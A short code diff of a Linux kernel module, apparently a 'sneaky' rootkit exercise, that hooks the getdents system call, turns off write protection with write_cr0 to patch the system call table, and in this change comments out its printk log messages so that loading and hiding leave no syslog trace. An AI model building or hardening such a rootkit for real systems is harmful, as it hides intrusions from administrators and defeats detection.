@@ -143,7 +143,7 @@ asmlinkage int (*original_call_getdents)(unsigned int fd, struct linux_dirent *d
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                     unsigned int count)
 {
-  printk(KERN_INFO "Getdents: Very, very Sneaky!\n");
+  //printk(KERN_INFO "Getdents: Very, very Sneaky!\n");
   
 
   int nread, bpos; 
@@ -194,9 +194,9 @@ static int initialize_sneaky_module(void)
   struct page *page_ptr;
 
   //See /var/log/syslog for kernel print output
-  printk(KERN_INFO "Sneaky module being loaded!!!!.\n");
+  //printk(KERN_INFO "Sneaky module being loaded!!!!.\n");
 
-  printk(KERN_INFO "sneaky_process_pid is an integer!!!!!: %d\n", sneaky_process_pid);
+  //printk(KERN_INFO "sneaky_process_pid is an integer!!!!!: %d\n", sneaky_process_pid);
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -231,7 +231,7 @@ static void exit_sneaky_module(void)
 {
   struct page *page_ptr;
 
-  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
+  //printk(KERN_INFO "Sneaky module being unloaded.\n"); 
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
